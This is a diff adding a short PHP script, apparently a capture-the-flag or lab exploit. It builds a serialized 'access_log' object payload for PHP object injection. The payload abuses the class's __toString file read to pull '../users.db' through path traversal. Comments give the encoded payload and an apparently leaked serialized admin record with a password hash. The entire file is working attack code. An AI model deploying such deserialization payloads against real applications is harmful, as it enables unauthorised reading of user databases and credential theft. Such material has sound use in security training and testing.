@@ -1,0 +1,21 @@
+<?php
+class access_log {
+    public $log_file;
+    function __construct($lf) {
+        $this->log_file = $lf;
+    }
+    function __toString() {
+        return $this->read_log();
+    }
+    function append_to_log($data) {
+        file_put_contents($this->log_file, $data, FILE_APPEND);
+    }
+    function read_log() {
+        return file_get_contents($this->log_file);
+    }
+}
+
+$obj = new access_log('../users.db');  // đường dẫn file bạn muốn đọc
+echo urlencode(base64_encode(serialize($obj)));
+//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czoxMToiLi4vdXNlcnMuZGIiO30 -key
+//O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:32:"90fffa9bd8fb0daf48e2c4eb05c091a5";}
